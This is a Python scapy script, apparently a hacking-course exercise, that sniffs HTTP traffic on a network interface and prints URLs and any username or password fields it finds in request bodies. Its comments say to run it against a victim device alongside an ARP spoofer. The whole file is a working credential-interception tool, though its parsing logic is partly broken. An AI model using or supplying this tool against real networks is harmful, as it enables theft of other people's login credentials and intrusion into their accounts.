#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

#THIS SNIFFER IS FOR HTTP WEBSITES ONLY
#TO RUN THIS ON VICTIM DEVICE, YOU NEED TO RUN ARP SPOOFER AND THIS AT THE SAME TIME
#imports http packet reader
def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet,)
    #iface= machine connected to the internet
    #store makes sure data is not stored in memory, so there is no load
    #prn= call back function
def printEff(split,usrKey):
    for uk in usrKey:
        if uk in split[0]:
            print("UserName:" + split[0])
        else:
            print("UserName:" + split[0])
            print("Password:" + split[1])
        break
def getUrl(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print("HTTP REQUEST >>>" + url)

#the getlogin function is required need this splitting step because the
# login data arrives as one long string, and you want to separate it into individual
# fields like username and password.
def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "usr", "user", "login", "password", "pass", "pwd"]
        # various different keywors developers can use
        for key in keywords:
            if key in load:
                split = load.split("&")
                usrKey = ["username", "usr", "user", "login"]
                return printEff(split, usrKey)
                # prints data neatly




#this function will basically check if the packet is an http request and if so 
#then it will extract url and search for the login credentials and then print information
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        getUrl(packet)
        login_info=get_login(packet)
        if login_info:
            print(login_info)




sniff("eth0")